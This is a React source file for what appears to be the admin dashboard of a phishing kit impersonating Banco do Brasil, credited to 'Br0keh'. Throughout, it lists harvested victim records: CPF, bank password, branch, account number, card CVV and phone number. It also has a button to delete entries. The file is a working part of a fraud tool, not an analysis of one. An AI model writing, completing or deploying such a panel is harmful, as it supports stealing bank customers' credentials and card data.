import React, { useEffect, useState } from "react";
import api from "../api";

const Dashboard = () => {
  const [lista, setLista] = useState([]);
  async function deletarInfo(e) {
    let id = e.target.name;

    let res = await api.get("/deletar?id=" + id, {
      headers: { token: localStorage.getItem("token") },
    });
    if (!res.data) return;

    setLista(res.data);
  }
  useEffect(() => {
    async function getList() {
      let res = await api.get("/list", {
        headers: { token: localStorage.getItem("token") },
      });
      if (!res.data) return;

      setLista(res.data);
    }

    getList();
  }, []);

  return (
    <div>
      <header style={{ backgroundColor: "#000", flexDirection: "column" }}>
        <div>Seja bem vindo ao painel, admin.</div>
        <div style={{ fontWeight: "normal" }}>{lista.length} VISITAS</div>
        <div style={{ fontWeight: "normal" }}>{lista.length} INFOS</div>
        <div style={{ fontWeight: "lighter", opacity: 0.8, marginTop: "30px" }}>
          Sistema Banco do Brasil feito por Br0keh
        </div>
      </header>
      <main>
        {lista &&
          lista.map((item) => (
            <div
              style={{ borderBottom: "2px solid #555", padding: "20px" }}
              key={item._id}
            >
              <b>CPF</b> {item.cpf} | <b>SENHA</b> {item.senha} | <b>AGÊNCIA</b>{" "}
              {item.agencia} | <b>CONTA</b> {item.conta} | <b>CVV</b> {item.cvv}{" "}
              | <b>CELULAR</b> {item.celular}
              <br />
              <br />
              <button
                style={{
                  border: "none",
                  padding: "10px",
                  borderRadius: "5px",
                  backgroundColor: "red",
                  color: "white",
                }}
                name={item._id}
                onClick={deletarInfo}
              >
                Deletar
              </button>
            </div>
          ))}
      </main>
    </div>
  );
};

export default Dashboard;
